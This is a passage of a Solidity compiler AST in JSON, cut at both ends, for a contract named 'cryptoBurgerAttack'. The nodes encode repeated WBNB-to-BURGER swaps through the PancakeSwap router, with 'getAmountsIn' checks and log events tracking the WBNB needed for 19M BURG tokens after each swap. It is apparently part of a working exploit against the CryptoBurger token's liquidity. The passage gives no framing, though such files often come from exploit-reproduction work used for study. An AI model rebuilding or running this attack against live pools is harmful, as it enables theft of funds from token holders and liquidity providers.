                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 447,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "4846:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 446,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "4846:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 452,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4846:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 439,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "4805:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 453,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4805:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 454,
                  "nodeType": "ExpressionStatement",
                  "src": "4805:64:0"
                },
                {
                  "expression": {
                    "id": 463,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 455,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "4879:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 460,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "4958:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 461,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "4987:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 457,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "4911:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 456,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "4894:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 458,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "4894:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 459,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "4894:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 462,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "4894:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "4879:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 464,
                  "nodeType": "ExpressionStatement",
                  "src": "4879:122:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "5468652072657175697265642057424e4220616d6f756e7420666f722031394d204255524720746f6b656e2061667465722034746820737761703a20",
                        "id": 466,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "5033:62:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_66c39c567512ba203266e09376ef840b4ab49bd764a09269464629cd7c25c1a4",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 4th swap: \""
                        },
                        "value": "The required WBNB amount for 19M BURG token after 4th swap: "
                      },
                      {
                        "baseExpression": {
                          "id": 467,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "5109:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 469,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 468,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "5122:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "5109:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_66c39c567512ba203266e09376ef840b4ab49bd764a09269464629cd7c25c1a4",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 4th swap: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 465,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "5016:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 470,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5016:118:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 471,
                  "nodeType": "EmitStatement",
                  "src": "5011:123:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422062616c616e6365206f6620636f6e7472616374",
                        "id": 473,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "5166:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        "value": "WBNB balance of contract"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 478,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "5239:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 477,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "5231:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 476,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "5231:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 479,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "5231:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 474,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "5206:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 475,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "5206:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 480,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "5206:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 472,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "5149:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 481,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5149:106:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 482,
                  "nodeType": "EmitStatement",
                  "src": "5144:111:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 484,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "5273:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 485,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "5279:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 486,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "5287:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 488,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 487,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "5300:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "5287:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 489,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "5304:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 494,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "5323:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 493,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "5315:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 492,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "5315:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 495,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "5315:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 491,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "5307:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 490,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "5307:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 496,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "5307:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 483,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "5266:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 497,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5266:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 498,
                  "nodeType": "ExpressionStatement",
                  "src": "5266:64:0"
                },
                {
                  "expression": {
                    "id": 507,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 499,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "5340:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 504,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "5419:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 505,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "5448:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 501,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "5372:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 500,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "5355:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 502,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "5355:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 503,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "5355:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 506,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "5355:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "5340:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 508,
                  "nodeType": "ExpressionStatement",
                  "src": "5340:122:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "5468652072657175697265642057424e4220616d6f756e7420666f722031394d204255524720746f6b656e2061667465722035746820737761703a20",
                        "id": 510,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "5494:62:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_e1138ff91e82076482657eced334bd9b17213aa287a1611636e63305172e15d2",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 5th swap: \""
                        },
                        "value": "The required WBNB amount for 19M BURG token after 5th swap: "
                      },
                      {
                        "baseExpression": {
                          "id": 511,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "5570:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 513,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 512,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "5583:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "5570:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_e1138ff91e82076482657eced334bd9b17213aa287a1611636e63305172e15d2",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 5th swap: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 509,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "5477:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 514,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5477:118:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 515,
                  "nodeType": "EmitStatement",
                  "src": "5472:123:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422062616c616e6365206f6620636f6e7472616374",
                        "id": 517,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "5627:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        "value": "WBNB balance of contract"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 522,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "5700:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 521,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "5692:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 520,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "5692:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 523,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "5692:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 518,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "5667:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 519,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "5667:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 524,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "5667:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 516,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "5610:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 525,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5610:106:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 526,
                  "nodeType": "EmitStatement",
                  "src": "5605:111:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 528,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "5733:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 529,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "5739:6:0",
